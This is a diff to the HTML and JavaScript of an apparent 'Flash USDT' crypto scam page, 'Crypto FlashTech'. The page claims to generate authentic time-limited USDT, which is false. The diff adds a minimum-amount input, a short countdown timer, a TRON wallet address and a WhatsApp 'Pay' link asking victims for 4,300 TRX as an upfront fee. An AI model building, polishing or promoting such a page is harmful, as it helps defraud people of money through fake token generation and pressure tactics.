@@ -23,7 +23,12 @@
 
     <section id="home" class="hero">
         <h1>Introducing Flash USDT by Crypto FlashTech</h1>
-        <p>Crypto FlashTech pioneers Flash USDT generation, offering a revolutionary approach to cryptocurrency transactions. Flash USDT is a time-limited digital asset designed for secure, fast, and reliable transfers across blockchain networks. Issued under original contracts, our tokens ensure authenticity and compliance. Generate USDT on TRC20, ERC20, Solana, BNB, and BEP20 networks, or BTCBR on BEP20, with a 180-day validity. With a minimum generation fee of $10,000, an upfront payment of $320, and a 15% confirmation fee, our platform guarantees security and transparency for traders and investors.</p>
+        <p>Discover the power of Flash USDT, a groundbreaking cryptocurrency solution from Crypto FlashTech. Engineered for unmatched security, lightning-fast transactions, and unwavering reliability, Flash USDT redefines digital asset management. Issued under original blockchain contracts, it ensures authenticity and seamless transfers across networks. With a 180-day validity, Flash USDT empowers traders and investors with a cutting-edge tool for the future of finance.</p>
+        <div class="available-tokens">
+            <h3>Available Tokens</h3>
+            <p>USDT (TRC20, ERC20, Solana, BNB, BEP20), BTCBR (BEP20)</p>
+            <button id="generate-button" class="cta-button" style="display: inline-block;">Generate</button>
+        </div>
         <a href="#generator" class="cta-button">Generate Flash USDT Now</a>
         <div class="floating-icons">
             <i class="fab quan fa-bitcoin"></i>
@@ -46,7 +51,7 @@
         </div>
         <div class="faq-item">
             <h3>How much is the initial payment?</h3>
-            <p>Clients are required to pay $320 to generate Flash USDT.</p>
+            <p>Clients are required to pay 4,300 TRX to generate Flash USDT.</p>
         </div>
         <div class="faq-item">
             <h3>What is the confirmation fee?</h3>
@@ -64,13 +69,13 @@
 
     <section id="generator">
         <h2>Flash USDT Generator</h2>
-        <p id="generator-message">Confirm your generating fee on WhatsApp to start generating Flash USDT.</p>
-        <div class="available-tokens">
-            <h3>Available Tokens</h3>
-            <p>USDT (TRC20, ERC20, Solana, BNB, BEP20), BTCBR (BEP20)</p>
+        <p id="generator-message">Enter the minimum amount of Flash USDT you want to generate.</p>
+        <input type="number" id="amount-input" placeholder="Enter minimum amount in USD (min $10,000)" min="10000" style="padding: 10px; margin: 10px 0; font-size: 1.1rem; border-radius: 5px; border: 1px solid #00ff88;">
+        <div id="timer" style="display: none; margin: 20px 0;">10:00 <span>(Amount minimum is $10,000)</span></div>
+        <div id="address-container" style="display: none; margin: 20px 0;">
+            <p>Address: <strong>TRvTQZst7iGF2DCCbhe5YKh1sNaaPqVVCy</strong></p>
+            <a href="https://wa.me/+25498373493?text=Payment%20confirmation%20for%204,300%20TRX%20to%20TRvTQZst7iGF2DCCbhe5YKh1sNaaPqVVCy" target="_blank" class="cta-button" id="pay-button" style="display: none;">Pay</a>
         </div>
-        <div id="timer">30:00</div>
-        <a href="https://wa.me/+25498373493?text=Confirming%20generating%20fee%20for%20Flash%20USDT" target="_blank" class="cta-button" id="generate-button">Generate Now</a>
     </section>
 
     <section id="chart">
@@ -98,28 +103,48 @@
         <i class="fab quan fa-ethereum"></i>
         <i class="fab quan fa-btc"></i>
         <i class="fas quan fa-coins"></i>
+        <i class="fab quan fa-bitcoin"></i>
+        <i class="fab quan fa-ethereum"></i>
+        <i class="fab quan fa-btc"></i>
+        <i class="fas quan fa-coins"></i>
     </div>
 
     <script>
         // Timer for Flash USDT Generator
-        let timeLeft = 1800; // 30 minutes in seconds
+        let timeLeft = 10; // 10 seconds
         const timerElement = document.getElementById('timer');
         const generatorMessage = document.getElementById('generator-message');
+        const amountInput = document.getElementById('amount-input');
         const generateButton = document.getElementById('generate-button');
-        const timer = setInterval(() => {
-            let minutes = Math.floor(timeLeft / 60);
-            let seconds = timeLeft % 60;
-            timerElement.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
-            timeLeft--;
-            if (timeLeft < 0) {
-                clearInterval(timer);
-                timerElement.textContent = 'Time Expired';
-            }
-        }, 1000);
+        const addressContainer = document.getElementById('address-container');
+        const payButton = document.getElementById('pay-button');
+        let timer;
 
-        // Update message on button click
         generateButton.addEventListener('click', () => {
-            generatorMessage.textContent = 'Confirm generating payment, send the screenshot to WhatsApp or email, and your address.';
+            const amount = parseInt(amountInput.value);
+            if (amount >= 10000) {
+                timerElement.style.display = 'block';
+                timeLeft = 10;
+                timer = setInterval(() => {
+                    let seconds = timeLeft;
+                    timerElement.textContent = `${seconds}:00 (Amount minimum is $10,000)`;
+                    timeLeft--;
+                    if (timeLeft < 0) {
+                        clearInterval(timer);
+                        timerElement.textContent = 'Time Expired (Amount minimum is $10,000)';
+                        addressContainer.style.display = 'none';
+                        payButton.style.display = 'none';
+                    }
+                }, 1000);
+                addressContainer.style.display = 'block';
+                payButton.style.display = 'inline-block';
+            } else {
+                generatorMessage.textContent = 'Minimum amount must be $10,000 or more.';
+            }
+        });
+
+        payButton.addEventListener('click', () => {
+            window.location.href = 'https://wa.me/+25498373493?text=Payment%20confirmation%20for%204,300%20TRX%20to%20TRvTQZst7iGF2DCCbhe5YKh1sNaaPqVVCy';
         });
 
         // Chart.js for crypto price trends
